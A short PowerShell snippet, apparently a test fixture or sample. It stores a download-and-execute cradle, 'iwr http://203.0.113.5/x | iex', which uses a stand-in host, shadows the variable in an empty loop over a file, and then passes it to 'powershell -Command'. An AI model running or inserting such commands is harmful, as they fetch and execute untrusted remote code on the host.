$c = "iwr http://203.0.113.5/x | iex"
foreach ($c in Get-Content x.txt) { }
powershell -Command $c
